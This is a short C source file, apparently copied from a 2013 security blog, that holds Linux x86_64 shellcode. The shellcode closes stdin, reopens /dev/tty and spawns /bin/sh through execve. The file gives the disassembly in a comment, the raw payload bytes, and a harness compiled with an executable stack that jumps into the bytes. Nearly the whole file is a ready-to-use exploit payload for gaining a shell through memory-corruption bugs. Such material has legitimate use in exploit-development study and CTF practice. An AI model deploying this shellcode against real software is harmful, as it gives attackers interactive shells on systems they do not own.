// taken at https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html

/* gcc -z execstack -o shell shell.c */
/* stdin reopen & execve /bin/sh shellcode for Linux/x86_64 */

/* 
   0x600880 <code>:    xor    rax,rax
   0x600883 <code+3>:  push   rax
   0x600884 <code+4>:  pop    rdi
   0x600885 <code+5>:  mov    al,0x3
   0x600887 <code+7>:  syscall   ; close(0)
   0x600889 <code+9>:  push   rax
   0x60088a <code+10>: movabs rdi,0x7974742f7665642f
   0x600894 <code+20>: push   rdi
   0x600895 <code+21>: push   rsp
   0x600896 <code+22>: pop    rdi
   0x600897 <code+23>: push   rax
   0x600898 <code+24>: pop    rsi
   0x600899 <code+25>: mov    si,0x2702
   0x60089d <code+29>: mov    al,0x2
   0x60089f <code+31>: syscall ; open("/dev/tty", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC)
   0x6008a1 <code+33>: push   rax
   0x6008a2 <code+34>: movabs rdi,0x68732f2f6e69622f
   0x6008ac <code+44>: push   rdi
   0x6008ad <code+45>: push   rsp
   0x6008ae <code+46>: pop    rdi
   0x6008af <code+47>: push   rax
   0x6008b0 <code+48>: push   rdi
   0x6008b1 <code+49>: push   rsp
   0x6008b2 <code+50>: pop    rsi
   0x6008b3 <code+51>: cqo    
   0x6008b5 <code+53>: mov    al,0x3b
   0x6008b7 <code+55>: syscall   ; execve("/bin//sh", ["/bin//sh"], NULL)
*/

void main(void) {

	char code[] = 
	"\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05"
	"\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05"
	"\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05";

    void (*f)() = (void(*)())code;
    f();
}